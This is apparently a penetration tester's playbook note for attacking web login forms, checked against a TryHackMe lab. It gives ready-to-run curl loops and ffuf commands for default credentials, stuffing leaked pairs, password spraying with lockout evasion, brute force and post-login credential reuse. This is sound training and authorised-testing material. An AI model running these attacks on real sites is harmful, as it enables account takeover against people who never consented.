
> **STATUS: CANONICAL** — first-principles + primary-source derivation; both oracle dialects (curl + ffuf) live-validated on THM:Guided Pentest: Web across all sections. Last audit: 2026-08-31.

Credential-based attacks against discovered login forms. Entry from [[Web Attack Checksheet]] sub-block 1.6 on login-form observation (fires Sections 1-4) and sub-block 1.14 on populated `users_<host>.txt` (fires Section 5).

Ordering: default creds first (30-sec cost, high P on OSCP+); credential stuffing next (if external pair list); password spray (one password × many users, lowest lockout risk, fastest to a first hit on weak-password targets); hit-and-hope brute force with common usernames (broader net, higher per-user attempt volume); enum-fed brute force last (requires target-enumerated usernames from [[Username Enumeration]]). Pre-flight checks cross-cut all sections — run once before Section 1.

## Pre-flight checks

Run Statefulness Probe (WAC 1.6) against the login form first if not already done. `ROUTE: burp` (rotating cookies / rotating hidden fields) → `[[Burp Credential Attacks]]`. `ROUTE: shell` → proceed.

#### Capture the forwarded static state the Probe emitted (or empty if none):

- `<login_static_cookies>` = `STATIC_COOKIES` value (e.g. `PHPSESSID=...`)
- `<login_static_hidden_fields>` = `STATIC_HIDDEN_FIELDS` value (raw, pre-encoded `name=value&...`, or empty)
- `<extra_headers>` = operator-supplied, NOT Probe-emitted (the Probe forwards only cookies + hidden fields). Set only if you have manually identified a required request header the Probe cannot see — e.g. a JS-set `X-CSRF-Token: ...` read from the form's JavaScript. Otherwise empty.

#### Assemble the always-on request-flag block:

`<req_flags>` = the three always-on header flags, plus a cookie flag only if the Probe forwarded one, plus an extra-header flag only if you set one:

- always: `-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36' -H 'Referer: http://<host>:<port>/<login_path>' -H 'Origin: http://<host>:<port>'`
- if `<login_static_cookies>` non-empty, append: `-b '<login_static_cookies>'`
- if `<extra_headers>` set, append: `-H '<extra_headers>'`

Resolve these once for the target; the resulting flag string is what you paste for every `<req_flags>` below.

#### Hidden fields: 

Wherever `<login_static_hidden_fields_appended>` appears at the end of a POST `-d` body, replace it with `&<login_static_hidden_fields>` if the Probe forwarded any (e.g. `&csrf=abc123`), or with nothing if it didn't.

⚠️ `[[Burp Credential Attacks]]` playbook body — build-when-encountered. Dispatch here comes from Statefulness Probe `ROUTE: burp` (WAC 1.6, upstream) and from the SUCCESS/FAIL oracle `BAIL` route below. Points to include: (1) Setup — Burp session-handling chain: [[Testing Replayability in Burp]] (confirm fresh state needed) → [[Fresh State Per Attempt]] (identify which fields to refresh — CSRF token / session cookie / hidden field / combination) → [[Automating Fresh State in Burp]] (implement macro + session handling rule); (2) Attack modes per section — Sniper (§1 default creds), Pitchfork (§2 credential stuffing, §3 spray one-password-per-round), Cluster Bomb (§4 hit-and-hope, §5 enum-fed); replicate the nsr set (empty / same-as-user / reversed-user) as an extra Pitchfork pass over the user list for §4 and §5; (3) Payload sets — same wordlists as CA §1-5; (4) Oracle — same filter-the-fail strategy as the shell path: derive the fail signature from two wrong-cred samples in Repeater/Comparer, then Intruder Grep-Match on the derived fail marker (present = fail, absent = success candidate); for a redirect app, match the fail `Location` path on the immediate response — do NOT enable Follow Redirects; (5) Rate-limit tuning — Pre-flight rate-limit probe does not run on the Burp path; derive independently via Repeater rapid-send or Intruder low-thread test, set Resource Pool request delay accordingly; (6) Build trigger — first real-target encounter where Statefulness Probe emits `ROUTE: burp` or the oracle `BAIL`s.

---

## Rate limiting profile

Establishes throttling posture. Tunes `<threads>` and `--delay` for Sections 2/4/5 (ffuf) and the SUCCESS/FAIL oracle probe (next section).

```bash
URL="http://<host>:<port>/<login_form_action>"; for i in $(seq 1 10); do curl -sX POST -o /dev/null -w '[%{http_code}][size:%{size_download}][time:%{time_total}s]\n' <req_flags> -d '<login_username_field>=xyzabc123xxx&<login_password_field>=wrong<login_static_hidden_fields_appended>' "$URL"; done
```

Route on output:

- Any HTTP 429 → hard rate limit. `<threads>` = 1 for all attacks; pass `--delay=<ms>` (500+) to `auth_oracle_probe.sh` in the SUCCESS/FAIL oracle section below.
- Response `time_total` grows across requests → soft throttle. `<threads>` = 1; pass `--delay=<ms>` (a millisecond integer, e.g. `--delay=250`) to `auth_oracle_probe.sh`.
- Response `size` changes at request N → possible lockout at threshold N. Keep any single-username attack under N/2 attempts. Password spray (Section 3) unaffected — one attempt per user per round.
- No changes across all 10 → no lockout observed. `<threads>` = 10 (ffuf) safe. No `--delay` needed on `auth_oracle_probe.sh`.

Save `<threads>` value for Sections 2/4/5 and any `--delay=<ms>` for the SUCCESS/FAIL oracle probe.

---

## SUCCESS/FAIL oracle

`~/scripts/auth_oracle_probe.sh --host=<host> --port=<port> --login-path=<login_path> --form-action=<login_form_action> --user-field=<login_username_field> --pass-field=<login_password_field> --cookies='<login_static_cookies>' --hidden-fields='<login_static_hidden_fields>' --extra-headers='<extra_headers>' [--delay=<ms>] [--scheme=<http|https>]`

Set `--delay=<ms>` from Pre-flight rate-limit probe if throttling detected. Add `--scheme=https` for TLS targets.

**Route on emitted markers:**

- `CLASS: content|redirect|api` + `ORACLE_SUMMARY: class=<c> confidence=<c>` → shell path OK; capture oracle vars below and proceed to Section 1.
- `CLASS: basic` + `ROUTE_OUT: Login Bypass Techniques Basic Auth section` → leave Credential Attacks; walk [[Login Bypass Techniques]] Basic Auth section.
- `BAIL: <reason>` (unusual fail status, no stable fail signature, curl failure) → escalate to `[[Burp Credential Attacks]]` (see ⚠️ Pre-flight above).
- `RATE_LIMITED: sample=<name> <detail>` → target throttled mid-sampling; re-run with higher `--delay`.

**Capture emitted values (substitute textually into the sections below):**

- `<oracle_ffuf>` = value from `ORACLE_FFUF:` line (filter-the-fail matcher/filter block, e.g. `-mc all -fmode and -fc 200 -fr '<marker>'`, or redirect `-mc all -fr 'Location:...'`).
- `<oracle_curl_success_test>` = value from `ORACLE_CURL_SUCCESS_TEST:` line. Wrap it once: `curl_oracle() { <oracle_curl_success_test>; }` — §1, §3 and the nsr passes call `curl_oracle`.

Note the emitted `FAIL_MARKER_CANDIDATE:` lines — ranked alternative markers (form field, error text, etc.) for manual pivot if the primary underperforms. If hits are implausibly few or zero, inspect one real login in Burp before concluding — the oracle is high-recall, not perfect-recall.

---

## 1. Default credentials

Fastest highest-EV attempt. ~30 seconds via automated loop. Curl dialect (tiny fixed set; the emitted oracle carries headers + forwarded state).

**Universal pairs (loop):**

```bash
URL="http://<host>:<port>/<login_form_action>"
while IFS=: read -r U P; do
  U="${U%"${U##*[![:space:]]}"}"; P="${P%"${P##*[![:space:]]}"}"
  if curl_oracle; then echo "SUCCESS $U:$P"; fi
done << 'EOF'
admin:admin
admin:password
admin:
root:root
root:toor
root:password
admin:admin123
administrator:administrator
administrator:password
test:test
guest:guest
user:user
root:
wpadmin:wpadmin
tomcat:tomcat
tomcat:s3cret
admin:tomcat
role1:role1
admin:changeme
EOF
```

Only candidate lines print (silent on fails). A printed line is a *candidate*, not a confirmed login — the oracle flags everything that isn't the observed failure, so false positives are expected. Verify each: confirmed real login → Section 6; false positive → discard, next candidate; on exhaustion → 2.

Route:

- Any candidate line → verify manually → confirmed real login → Section 6; false positive → discard, next candidate; on exhaustion → 2
- No output → all default creds failed → 2

---

## 2. Credential stuffing

Try known/plausibly-leaked username:password pairs (from GitHub search, HIBP, engagement scope, prior foothold on adjacent service). ffuf pitchfork (wordlist-scale, one attack per aligned row).

Precondition: pair list available. Unmet (no pair list at all) → 3.

**Prep pair list.** Common leak format is `<username>:<password>` per line. Split into aligned files:

```bash
cut -d: -f1 pairs.txt > users.txt
cut -d: -f2- pairs.txt > passwords.txt
```

**ffuf pitchfork (aligned pairs, one attack per row):**

`ffuf -w users.txt:FUZZUSER -w passwords.txt:FUZZPASS -mode pitchfork -X POST -d '<login_username_field>=FUZZUSER&<login_password_field>=FUZZPASS<login_static_hidden_fields_appended>' -H 'Content-Type: application/x-www-form-urlencoded' <req_flags> -u http://<host>:<port>/<login_form_action> <oracle_ffuf> -t <threads> -o ffuf_stuff_<host>_<port>.json -of json`

Route:

- Any ffuf result (a *candidate*, not a confirmed login) → verify manually → confirmed → Section 6; false positive → discard, next candidate; on exhaustion → 3
- ffuf found no matches → 3

---

## 3. Password spray

One common password against many users. Evades per-user account lockout (each user gets exactly one attempt per round).

Precondition: username candidate list — use `/usr/share/seclists/Usernames/top-usernames-shortlist.txt` if `users_<host>.txt` empty, both concatenated if populated.

**Ensure `curl_oracle` is correct defined prior to execution:**

```bash
URL="http://<host>:<port>/<login_form_action>"
for P in "Password1" "Password123" "Welcome1" "Winter2026!" "Summer2026!" "Autumn2026!" "Spring2026!" "Company123" "changeme" "Demo1234" "password321"; do
  echo "=== spraying: $P ==="
  while IFS= read -r U; do
    U="${U%"${U##*[![:space:]]}"}"
    if curl_oracle; then echo "SUCCESS $U:$P"; fi
  done < <userlist>
done
```

Substitute `<userlist>` (shortlist path or `users_<host>.txt`). Adjust seasonal passwords to the target's locale/current year. Add company-name variants if known (e.g. `<company>123`, `<company>2026`).

Route:

- Any `SUCCESS $U:$P` line (a *candidate*, not a confirmed login) → verify manually → confirmed → Section 6; false positive → discard, next candidate; on exhaustion → 4
- All sprays return no hits → 4

---

## 4. Hit-and-hope brute force

Common usernames × common passwords. No target-specific enumeration required. Broader password net than spray, at higher per-user attempt volume — run after spray. ffuf cluster bomb (wordlist-scale) plus a small nsr pass.

⚠️ Precondition: `<threads>` established from Pre-flight lockout probe. If lockout risk is high, this section's per-user volume is the risk — prefer to stop after spray (§3) and move to enumeration.

**ffuf cluster bomb (common user × common password shortlists):**

`ffuf -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt:FUZZUSER -w /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-100.txt:FUZZPASS -mode clusterbomb -X POST -d '<login_username_field>=FUZZUSER&<login_password_field>=FUZZPASS<login_static_hidden_fields_appended>' -H 'Content-Type: application/x-www-form-urlencoded' <req_flags> -u http://<host>:<port>/<login_form_action> <oracle_ffuf> -t <threads> -o ffuf_hitand_<host>_<port>.json -of json`

**nsr pass (empty password / password=username / password=reversed-username).** Replicates Hydra `-e nsr`; curl dialect over the same user list:

```bash
URL="http://<host>:<port>/<login_form_action>"
while IFS= read -r U; do
  U="${U%"${U##*[![:space:]]}"}"
  for P in "" "$U" "$(printf '%s' "$U" | rev)"; do
    if curl_oracle; then echo "SUCCESS $U:$P"; fi
  done
done < /usr/share/seclists/Usernames/top-usernames-shortlist.txt
```

Route:

- Any ffuf result OR `SUCCESS $U:$P` line (all *candidates*, not confirmed) → verify manually → confirmed → Section 6; false positive → discard, next candidate; on exhaustion → 5
- Exhausted, no success → 5

---

## 5. Enum-fed brute force

Full password wordlist × target-enumerated usernames. Highest per-attempt P (no wasted guesses on non-existent users), highest time cost — fires last, from WAC sub-block 1.14 when `users_<host>.txt` is populated by [[Username Enumeration]] or IDOR.

⚠️ Precondition: `users_<host>.txt` contains one or more entries. If empty → this section does not fire → return to [[Web Attack Checksheet]]

**ffuf cluster bomb (enumerated users × top-1000 passwords):**

`ffuf -w users_<host>.txt:FUZZUSER -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt:FUZZPASS -mode clusterbomb -X POST -d '<login_username_field>=FUZZUSER&<login_password_field>=FUZZPASS<login_static_hidden_fields_appended>' -H 'Content-Type: application/x-www-form-urlencoded' <req_flags> -u http://<host>:<port>/<login_form_action> <oracle_ffuf> -t <threads> -o ffuf_enum_<host>_<port>.json -of json`

**nsr pass over enumerated users** (empty / same-as-user / reversed):

```bash
URL="http://<host>:<port>/<login_form_action>"
while IFS= read -r U; do
  U="${U%"${U##*[![:space:]]}"}"
  for P in "" "$U" "$(printf '%s' "$U" | rev)"; do
    if curl_oracle; then echo "SUCCESS $U:$P"; fi
  done
done < users_<host>.txt
```

**Target-derived wordlist (CeWL).** If common wordlists exhaust with no hit, generate a target-specific list and re-run the ffuf cluster bomb above with `-w cewl_<host>.txt:FUZZPASS`:

`cewl -d 2 -m 5 -w cewl_<host>.txt http://<host>:<port>/`

Route:

- Any ffuf result OR `SUCCESS $U:$P` line (all *candidates*, not confirmed) → verify manually → confirmed → Section 6; false positive → discard, next candidate; on exhaustion → CeWL pass, then return to WAC after 1.14
- All combinations exhausted → return to [[Web Attack Checksheet]] sub-block after 1.14

---

## 6. Post-success routing

On verified successful login (recovered `<user>:<pass>`):

1. Log to `route_<ip>.txt`:

    `printf '[Credential Attacks] APPLIED: creds recovered <user>:<pass> on <host>:<port><login_path>\n' >> route_<ip>.txt`

2. Save to `creds_<host>.txt` for cross-service reuse:

    `echo '<user>:<pass>' >> creds_<host>.txt`

3. Capture session cookie from a fresh successful login (browser-header doctrine applied):

    `curl -sX POST -i <req_flags> --data-urlencode '<login_username_field>=<user>' --data-urlencode '<login_password_field>=<pass>' http://<host>:<port>/<login_form_action> | grep -i '^Set-Cookie:'`

4. Route by post-login surface:

- Session cookie set (opaque OR JWT-shaped) → use in `Cookie:` header for authenticated requests; re-walk [[Web Attack Checksheet]] sub-blocks 1.6-1.13 authenticated (often reveals admin surface / additional routes invisible unauth)
- JWT-shaped cookie (three base64 segments dot-separated) → also consider [[Session Cookie Attacks]] (JWT branch) for privilege escalation via token forge
- Admin surface reached with RCE-viable feature (plugin/theme upload, arbitrary file upload, command exec panel) → [[File Upload]] or relevant WAC technique
- Direct RCE / shell obtained via authenticated feature → escalate to [[Linux Privilege Escalation Checksheet]] / [[Windows Privilege Escalation Checksheet]]
- Same credentials work against other services on target (SSH, database, RDP) → try laterally per [[MASTER WORKFLOW/Step 6. Vulnerability Analysis]] Pass 2/3 per-service workflows

---

## Exhaustion

Sections 1-5 all exhausted without foothold:

- If entered from WAC 1.5 → continue Step 1 walking (1.7 register form, then 1.8 forgot-password, etc.)
- If entered from WAC 1.14 → return to [[Web Attack Checksheet]] Step 5 (deferred low-EV sweep)

---

## Validation

THM:Guided Pentest: Web

